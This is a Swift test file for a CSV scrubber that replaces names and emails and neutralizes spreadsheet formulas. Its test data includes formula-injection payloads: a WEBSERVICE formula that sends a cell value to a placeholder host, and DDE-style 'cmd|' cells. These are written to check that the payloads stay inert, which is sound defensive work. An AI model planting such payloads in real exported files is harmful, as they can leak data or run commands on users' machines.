import Foundation
@testable import ScrubCore
import Testing

@Test func csvScrubsRowsAndReportsTable() throws {
    let input = "first_name,last_name,email,department\nRobert,Mitchell,rmitchell@acme.com,Finance\nAna,Pereira,ana.pereira@acme.com,Legal\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    #expect(result.format == "csv")
    #expect(!String(decoding: result.output, as: UTF8.self).contains("rmitchell@acme.com"))
    if case .table(let columns, let rows, let rowCount, let marks) = result.preview {
        #expect(columns == ["first_name", "last_name", "email", "department"])
        #expect(rowCount == 2)
        #expect(rows[0][3] == "Finance")
        #expect(!marks.isEmpty)
    } else { Issue.record("Expected table preview") }
}

@Test(arguments: ["\n=1+1", " =1+1", "\t=1+1", "＝1+1", "＠SUM(A1)", "＋cmd|x", "－cmd|x", "\r@SUM(A1)"])
func csvNeutralizesFormula(_ cell: String) {
    #expect(CSVFile.neutralize(cell) == "'" + cell)
}

@Test(arguments: ["-12.5", "+4", " +4", "+1 212 867 5309", "－12"])
func csvLeavesSignedNumber(_ cell: String) {
    #expect(CSVFile.neutralize(cell) == nil)
}

@Test func csvOutputPreservesLineTerminator() throws {
    let result = try Scrubber.scrub(Data("id,note\r\n1,=SUM(A1)\r\n".utf8), name: "a.csv")
    #expect(String(decoding: result.output, as: UTF8.self).contains("\r\n"))
    #expect(result.neutralized == 1)
}

@Test func csvFirstRowWithPatternsIsData() throws {
    let input = "1,Robert Mitchell,alice@example.com\n2,Ana Pereira,ana@example.org\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    #expect(String(decoding: result.output, as: UTF8.self).hasPrefix("1,"))
    if case .table(let columns, _, let rowCount, _) = result.preview {
        #expect(columns[0] == "column 1")
        #expect(rowCount == 2)
    } else { Issue.record("Expected table preview") }
}

@Test func csvHeaderCellsAreScanned() throws {
    let input = "month,alice@example.com,bob@example.org\njan,3,4\nfeb,5,6\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    let output = String(decoding: result.output, as: UTF8.self)
    #expect(!output.contains("alice@example.com"))
    #expect(!output.contains("bob@example.org"))
}

@Test func csvFormulaInHeaderAndBareQuotes() throws {
    let input = "=WEBSERVICE(\"https://x.invalid/?r=\"&B2),name\n1,Robert Mitchell\n2,Ana Pereira\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    let output = String(decoding: result.output, as: UTF8.self)
    #expect(try CSVFile.parse(output, delimiter: ",")[0][0].hasPrefix("'=WEBSERVICE("))
    #expect(result.neutralized == 1)
    #expect(!output.contains("Robert Mitchell"))
}

@Test func csvPreviewStopsAtFiveHundredRows() throws {
    let input = "id,notes\n" + (1...501).map { "\($0),plain" }.joined(separator: "\n") + "\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    if case .table(_, let rows, let rowCount, _) = result.preview {
        #expect(rows.count == 500)
        #expect(rowCount == 501)
    } else { Issue.record("Expected table preview") }
}

@Test(arguments: [",", ";", "\t", "|"])
func csvSniffsDelimiter(_ delimiter: String) throws {
    let input = "name\(delimiter)email\nRobert Mitchell\(delimiter)robert@example.com\nAna Pereira\(delimiter)ana@example.com\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    #expect(result.format == "csv")
    if case .table(let columns, let rows, _, _) = result.preview {
        #expect(columns == ["name", "email"])
        #expect(rows[0].count == 2)
    } else { Issue.record("Expected table preview") }
}

@Test func csvRowsAssociateNamesAndEmails() throws {
    let input = "first_name,last_name,email\nRobert,Mitchell,rmitchell@acme.com\nAna,Pereira,ana.pereira@acme.com\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    let rows = try CSVFile.parse(String(decoding: result.output, as: UTF8.self), delimiter: ",")
    #expect(rows[1][2].hasPrefix("\(rows[1][0].prefix(1).lowercased())\(rows[1][1].lowercased())@"))
    #expect(rows[2][2].hasPrefix("\(rows[2][0].lowercased()).\(rows[2][1].lowercased())@"))
}

@Test func csvSniffsSingleQuotedDialect() throws {
    let input = "'name';'email'\n'Robert Mitchell';'robert@example.com'\n'Ana Pereira';'ana@example.com'\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    let rows = try CSVFile.parse(String(decoding: result.output, as: UTF8.self), delimiter: ";", quoteCharacter: "'")
    #expect(rows[0] == ["name", "email"])
    #expect(rows[1][0] != "Robert Mitchell")
    #expect(rows[1][1] != "robert@example.com")
}

@Test func csvFormulaCellsRemainInertAfterWriting() throws {
    let input = "id,ref,phone,delta\n1,\"=WEBSERVICE(\"\"https://example.invalid/?r=\"\"&B2)\",+1 212 867 5309,-12.5\n2,@SUM(A1),n/a,+4\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    let rows = try CSVFile.parse(String(decoding: result.output, as: UTF8.self), delimiter: ",")
    #expect(rows[1][1].hasPrefix("'=WEBSERVICE"))
    #expect(rows[2][1] == "'@SUM(A1)")
    #expect(rows[1][3] == "-12.5")
    #expect(rows[2][3] == "+4")
    #expect(!rows[1][2].hasPrefix("'"))
    #expect(result.neutralized == 2)
}

@Test(arguments: ["\n=1+1", " =1+1", "\t=1+1", "＝1+1", "＠SUM(A1)", "＋cmd|x", "－cmd|x", "\r@SUM(A1)"])
func csvFormulaVariantsRemainInertAfterWriting(_ cell: String) throws {
    let input = "id,note\n1,\"\(cell.replacingOccurrences(of: "\"", with: "\"\""))\"\n2,plain\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    let rows = try CSVFile.parse(String(decoding: result.output, as: UTF8.self), delimiter: ",")
    #expect(rows[1][1] == "'" + cell)
    #expect(result.neutralized == 1)
}
